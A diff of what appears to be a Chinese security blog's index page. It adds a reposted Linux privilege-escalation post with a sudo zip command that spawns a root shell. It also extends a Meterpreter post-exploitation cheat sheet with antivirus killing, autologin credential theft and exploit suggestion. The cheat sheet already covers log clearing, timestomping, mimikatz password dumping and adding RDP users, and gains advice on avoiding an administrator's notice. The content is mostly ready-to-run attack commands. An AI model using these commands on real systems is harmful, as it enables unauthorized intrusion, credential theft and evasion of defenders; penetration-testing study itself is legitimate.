@@ -304,6 +304,105 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-【转载】Linux 提权方式总结" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      
+<a href="/2020/03/27/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91Linux%20%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/" class="article-date">
+      <time datetime="2020-03-27T06:12:08.651Z" itemprop="datePublished">2020-03-27</time>
+</a>
+
+ 
+    <a href="/2020/03/27/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91Linux%20%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/#comments" title="查看评论">
+        <i class="fa fa-comments-o" aria-hidden="true"></i>
+        <span class="count-comment"></span>
+        
+        
+            <span class="disqus-comment-count" data-disqus-identifier="2020/03/27/【转载】Linux 提权方式总结/"></span>
+        
+    </a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/03/27/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91Linux%20%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/">Linux提权方式总结</a>
+    </h1>
+  
+
+        
+          <div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <span class="post-count">748字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">2分</span>
+      </span>
+    </span>
+</div>
+        
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+              <p>【转】<a href="https://cloud.tencent.com/developer/article/1544037">https://cloud.tencent.com/developer/article/1544037</a></p>
+<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a><strong>补充</strong></h1><h2 id="利用zip提权"><a href="#利用zip提权" class="headerlink" title="利用zip提权"></a>利用zip提权</h2><p>使用sudo -l 查看当前用户可以使用的root提权命令信息，发现可以执行tar和zip相关命令。<br>touch exploit<br>sudo -u root zip exploit.zip exploit -T –unzip-command=”sh -c /bin/bash”</p>
+          
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/Linux%E6%8F%90%E6%9D%83/">Linux提权</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux%E6%8F%90%E6%9D%83/" rel="tag">Linux提权</a></li></ul>
+    </div>
+
+      
+        <p class="article-more-link">
+          <a href="/2020/03/27/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91Linux%20%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/#more">more >></a>
+        </p>
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-提权------_iis6.exe溢出提权" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1102,7 +1201,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
-        <span class="post-count">2.2k字</span>
+        <span class="post-count">2.3k字</span>
       </span>
     </span>
 
@@ -1111,7 +1210,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">9分</span>
+        <span class="post-count">10分</span>
       </span>
     </span>
 </div>
@@ -1138,7 +1237,7 @@
 
 
 <p><strong>5）migrate进程迁移</strong><br>可以迁移到 ：winlogon.exe</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getpid    <span class="comment"># 获取当前进程的pid</span></span><br><span class="line">ps   <span class="comment"># 查看当前活跃进程</span></span><br><span class="line">migrate &lt;pid值&gt;    <span class="comment">#将Meterpreter会话移植到指定pid值进程中</span></span><br><span class="line">kill &lt;pid值&gt;   <span class="comment">#杀死进程</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">getpid    <span class="comment"># 获取当前进程的pid</span></span><br><span class="line">ps   <span class="comment"># 查看当前活跃进程</span></span><br><span class="line">migrate &lt;pid值&gt;    <span class="comment">#将Meterpreter会话移植到指定pid值进程中</span></span><br><span class="line">kill &lt;pid值&gt;   <span class="comment">#杀死进程</span></span><br><span class="line">meterpreter &gt; run post/windows/manage/migrate 		<span class="comment">#自动查找合适进程进行迁移</span></span><br></pre></td></tr></table></figure>
 
 <p><strong>6）clearav清除日志</strong></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clearav  <span class="comment">#清除windows中的应用程序日志、系统日志、安全日志</span></span><br></pre></td></tr></table></figure>
@@ -1150,7 +1249,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">timestomp C:// -h   <span class="comment">#查看帮助</span></span><br><span class="line">timestomp -v C://<span class="number">2.</span>txt   <span class="comment">#查看时间戳</span></span><br><span class="line">timestomp C://<span class="number">2.</span>txt -f C://<span class="number">1.</span>txt <span class="comment">#将1.txt的时间戳复制给2.txt</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a><strong>网络命令</strong></h2><p><strong>1）基本网络命令</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ipconfig/ifconfig</span><br><span class="line">netstat –ano</span><br><span class="line">arp</span><br><span class="line">getproxy   <span class="comment">#查看代理信息</span></span><br><span class="line">route   <span class="comment">#查看路由</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ipconfig/ifconfig</span><br><span class="line">meterpreter &gt; run post/windows/manage/autoroute  <span class="comment">#查看子网情况</span></span><br><span class="line">netstat –ano</span><br><span class="line">arp</span><br><span class="line">getproxy   <span class="comment">#查看代理信息</span></span><br><span class="line">route   <span class="comment">#查看路由</span></span><br></pre></td></tr></table></figure>
 
 <p><strong>2）portfwd端口转发</strong></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -l <span class="number">6666</span> -p <span class="number">3389</span> -r <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="comment">#将目标机的3389端口转发到本地6666端口</span></span><br></pre></td></tr></table></figure>
@@ -1170,7 +1269,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/modules/post/windows/gather</span><br><span class="line">/usr/share/metasploit-framework/modules/post/linux/gather</span><br></pre></td></tr></table></figure>
 
 <p><strong>信息收集的脚本较多，仅列几个常用的：</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/checkvm <span class="comment">#是否虚拟机</span></span><br><span class="line">run post/linux/gather/checkvm <span class="comment">#是否虚拟机</span></span><br><span class="line">run post/windows/gather/forensics/enum_drives <span class="comment">#查看分区</span></span><br><span class="line">run post/windows/gather/enum_applications <span class="comment">#获取安装软件信息</span></span><br><span class="line">run post/windows/gather/dumplinks   <span class="comment">#获取最近的文件操作</span></span><br><span class="line">run post/windows/gather/enum_ie  <span class="comment">#获取IE缓存</span></span><br><span class="line">run post/windows/gather/enum_chrome   <span class="comment">#获取Chrome缓存</span></span><br><span class="line">run post/windows/gather/enum_patches  <span class="comment">#补丁信息</span></span><br><span class="line">run post/windows/gather/enum_domain  <span class="comment">#查找域控</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/checkvm <span class="comment">#是否虚拟机</span></span><br><span class="line">run post/windows/manage/killav <span class="comment">#关闭杀毒软件</span></span><br><span class="line"></span><br><span class="line">run post/windows/gather/enum_logged_on_users		<span class="comment">#获取域账号SID</span></span><br><span class="line"></span><br><span class="line">run post/linux/gather/checkvm <span class="comment">#是否虚拟机</span></span><br><span class="line">run post/windows/gather/forensics/enum_drives <span class="comment">#查看分区</span></span><br><span class="line">run post/windows/gather/enum_applications <span class="comment">#获取安装软件信息</span></span><br><span class="line">run post/windows/gather/dumplinks   <span class="comment">#获取最近的文件操作</span></span><br><span class="line">run post/windows/gather/enum_ie  <span class="comment">#获取IE缓存</span></span><br><span class="line">run post/windows/gather/enum_chrome   <span class="comment">#获取Chrome缓存</span></span><br><span class="line">run post/windows/gather/enum_patches  <span class="comment">#补丁信息</span></span><br><span class="line">run post/windows/gather/enum_domain  <span class="comment">#查找域控</span></span><br><span class="line">run post/windows/gather/enum_logged_on_users  <span class="comment">#列举当前有多少用户登录了目标机器</span></span><br><span class="line"></span><br><span class="line">run windows/gather/credentials/windows_autologin  <span class="comment">#抓取自动登录的用户名和密码</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="提权"><a href="#提权" class="headerlink" title="*提权"></a><em>*提权</em></h2><p><strong>1)getsystem提权</strong></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br><span class="line">getsystem工作原理：</span><br><span class="line">①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。</span><br><span class="line">②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。</span><br><span class="line">③Windows服务已启动，导致与命名管道建立连接。</span><br><span class="line">④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。</span><br><span class="line">然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。</span><br></pre></td></tr></table></figure>
@@ -1181,8 +1280,7 @@
 
 <p><strong>3)内核漏洞提权</strong></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">可先利用enum_patches模块 收集补丁信息，然后查找可用的exploits进行提权</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  <span class="comment">#查看补丁信息</span></span><br><span class="line">msf &gt; use exploit/windows/local/ms13_053_schlamperei</span><br><span class="line">msf &gt; set SESSION <span class="number">2</span></span><br><span class="line">msf &gt; exploit</span><br></pre></td></tr></table></figure>
-
-
+<p><strong>4)post/multi/recon/local_exploit_suggester 提权，设置session</strong></p>
 <h2 id="mimikatz抓取密码"><a href="#mimikatz抓取密码" class="headerlink" title="mimikatz抓取密码"></a><strong>mimikatz抓取密码</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz    <span class="comment">#help mimikatz 查看帮助</span></span><br><span class="line">wdigest  <span class="comment">#获取Wdigest密码</span></span><br><span class="line">mimikatz_command -f samdump::hashes  <span class="comment">#执行mimikatz原始命令</span></span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br></pre></td></tr></table></figure>
 
 
@@ -1190,7 +1288,7 @@
 <h2 id="远程桌面-amp-截屏"><a href="#远程桌面-amp-截屏" class="headerlink" title="远程桌面&amp;截屏"></a><strong>远程桌面&amp;截屏</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">enumdesktops  <span class="comment">#查看可用的桌面</span></span><br><span class="line">getdesktop    <span class="comment">#获取当前meterpreter 关联的桌面</span></span><br><span class="line">set_desktop   <span class="comment">#设置meterpreter关联的桌面  -h查看帮助</span></span><br><span class="line">screenshot  <span class="comment">#截屏</span></span><br><span class="line">use espia  <span class="comment">#或者使用espia模块截屏  然后输入screengrab</span></span><br><span class="line">run vnc  <span class="comment">#使用vnc远程桌面连接</span></span><br></pre></td></tr></table></figure>
 
 
-<h2 id="开启rdp-amp-添加用户"><a href="#开启rdp-amp-添加用户" class="headerlink" title="开启rdp&amp;添加用户"></a><strong>开启rdp&amp;添加用户</strong></h2><p><strong>1)getgui命令</strong></p>
+<h2 id="开启rdp-amp-添加用户"><a href="#开启rdp-amp-添加用户" class="headerlink" title="开启rdp&amp;添加用户"></a><strong>开启rdp&amp;添加用户</strong></h2><p>远程登录前用query user看下当前所有登录用户，别管理员登录着，被发现了<br><strong>1)getgui命令</strong></p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">run getgui –h <span class="comment">#查看帮助</span></span><br><span class="line">run getgui <span class="literal">-e</span> <span class="comment">#开启远程桌面</span></span><br><span class="line">run getgui <span class="literal">-u</span> lltest2 <span class="literal">-p</span> <span class="number">123456</span>   <span class="comment">#添加用户</span></span><br><span class="line">run getgui <span class="operator">-f</span> <span class="number">6661</span> –e   <span class="comment">#3389端口转发到6661</span></span><br><span class="line">getgui 系统不推荐，推荐使用run post/windows/manage/enable_rdp</span><br><span class="line">getgui添加用户时，有时虽然可以成功添加用户，但是没有权限通过远程桌面登陆</span><br></pre></td></tr></table></figure>
 
 
@@ -1279,100 +1377,6 @@
       
     <div class="article-category tagcloud">
     <a class="article-category-link" href="/categories/%E5%90%8E%E6%B8%97%E9%80%8F/">后渗透</a>
-    </div>
-
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-路由交换技术的习题" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      
-<a href="/2020/03/25/%E8%B7%AF%E7%94%B1%E4%BA%A4%E6%8D%A2%E6%8A%80%E6%9C%AF%E7%9A%84%E4%B9%A0%E9%A2%98/" class="article-date">
-      <time datetime="2020-03-25T00:01:14.411Z" itemprop="datePublished">2020-03-25</time>
-</a>
-
- 
-    <a href="/2020/03/25/%E8%B7%AF%E7%94%B1%E4%BA%A4%E6%8D%A2%E6%8A%80%E6%9C%AF%E7%9A%84%E4%B9%A0%E9%A2%98/#comments" title="查看评论">
-        <i class="fa fa-comments-o" aria-hidden="true"></i>
-        <span class="count-comment"></span>
-        
-        
-            <span class="disqus-comment-count" data-disqus-identifier="2020/03/25/路由交换技术的习题/"></span>
-        
-    </a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/03/25/%E8%B7%AF%E7%94%B1%E4%BA%A4%E6%8D%A2%E6%8A%80%E6%9C%AF%E7%9A%84%E4%B9%A0%E9%A2%98/">路由交换习题</a>
-    </h1>
-  
-
-        
-          <div style="margin-top:10px;">
-    <span class="post-time">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-keyboard-o"></i>
-        <span class="post-meta-item-text">  字数统计: </span>
-        <span class="post-count">188字</span>
-      </span>
-    </span>
-
-    <span class="post-time">
-      &nbsp; | &nbsp;
-      <span class="post-meta-item-icon">
-        <i class="fa fa-hourglass-half"></i>
-        <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">1分</span>
-      </span>
-    </span>
-</div>
-        
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>1、<strong>RIP路由更新时</strong>,对本路由表中已有的路由项,<strong>当发送报文的网关相同时</strong>,<strong>不论度量值增大或是减少,都更新该路由项</strong>(度量值相同时只将其老化定时器清零)。</p>
-<p>2、相同的路由来源提供了多条到达相同目的地的路由，路由器通过<strong>路由的度量值</strong>来确定使用哪一条路由。</p>
-<p>3、与静态路由协议相比，动态路由的优点:<strong>1.路由器能自动计算新的路由 2.路由器能自动发现网络拓扑变化</strong></p>
-<p>4、RIP是在UDP协议之上的一种路由协议。</p>
-<p>5、通过Hub组建的以太网的实质是 共享式以太网。</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/%E8%B7%AF%E7%94%B1%E4%BA%A4%E6%8D%A2/">路由交换</a>
     </div>
 
 
